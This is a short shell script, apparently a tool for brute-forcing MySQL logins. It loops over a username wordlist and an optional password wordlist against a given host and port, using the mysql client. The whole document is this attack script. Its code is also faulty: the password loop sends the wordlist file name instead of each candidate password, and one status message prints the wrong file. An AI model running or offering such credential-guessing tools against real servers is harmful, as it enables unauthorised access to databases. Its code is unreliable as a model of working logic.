


echo "                                  "
echo " .▄▄ · .▄▄▄  ▄▄▌       ▄▄▄▄· ▄▄▄▄▄▄▄"
echo " ▐█ ▀. ▐▀•▀█ ██•       ▐█ ▀█▪•██▄▄  "
echo " ▄▀▀▀█▄█▌·.█▌██▪  ▄▄▄  ▐█▀▀█▄ ▐█.▪"
echo " ▐█▄▪▐█▐█▪▄█·▐█▌▐▌     ██▄▪▐█ ▐█▌·"
echo "  ▀▀▀▀ ·▀▀█. .▀▀▀      ·▀▀▀▀  ▀▀▀ "
echo "  BY: https://github.com/them3x   "
echo "                                  "

host=$1
port=$2
uwor=$3

if [ "$#" -eq 3 ]
then
	pwor="False"

elif [ "$#" -eq 4 ]
then

	pwor=$4
else
        echo " "
        echo "sh $0 <HOST> <PORT> <USER-WORDLIST> <PASSWORD-WORDLIST(OPTIONAL)>"
        echo " "
	exit
fi

if [ $pwor = "False" ]
then
	echo "[!] Brute force without password"
	if [ -e "$uwor" ]
	then
		echo "[USER_WORDLIST] $uwor"
		echo " "
	else
		echo "File: [ $uwor ] Not found !"
		exit
	fi
	for user in $(cat $uwor)
	do
		mysql -h $host -u $user -P $port
	done

else

        echo "[!] Brute force with password"
        if [ -e "$uwor" ]
        then
                echo "[USER_WORDLIST] $uwor"
        else
                echo "File: [ $uwor ] Not found !"
                exit
        fi

        if [ -e "$pwor" ]
        then
                echo "[PASSWORD_WORDLIST] $uwor"
                echo " "
        else
                echo "File: [ $pwor ] Not found !"
                exit
        fi



        for user in $(cat $uwor)
        do
		for pass in $(cat $pwor)
			do
				echo "Trying "$user:$pass
		                mysql -h $host -u $user -P $port --password="$pwor"
			done
        done



fi
